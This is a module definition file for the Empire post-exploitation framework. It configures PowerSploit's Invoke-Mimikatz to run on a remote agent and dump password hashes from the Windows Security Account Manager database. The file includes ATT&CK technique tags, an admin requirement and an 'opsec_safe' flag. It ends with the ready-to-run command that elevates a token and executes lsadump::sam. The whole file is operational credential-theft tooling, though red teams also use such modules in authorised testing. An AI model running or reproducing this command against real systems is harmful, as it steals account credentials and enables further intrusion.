name: Invoke-Mimikatz SAM dump
authors:
  - '@JosephBialek'
  - '@gentilkiwi'
description: Runs PowerSploit's Invoke-Mimikatz function to extract hashes from the
  Security Account Managers (SAM) database.
software: S0002
techniques:
  - T1098
  - T1003
  - T1081
  - T1207
  - T1075
  - T1097
  - T1145
  - T1101
  - T1178
background: true
output_extension:
needs_admin: true
opsec_safe: true
language: powershell
min_language_version: '2'
comments:
  - http://clymb3r.wordpress.com/
  - http://blog.gentilkiwi.com
  - https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump#lsa
options:
  - name: Agent
    description: Agent to run module on.
    required: true
    value: ''
script_path: 'empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1'
script_end: Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam" "token::revert"';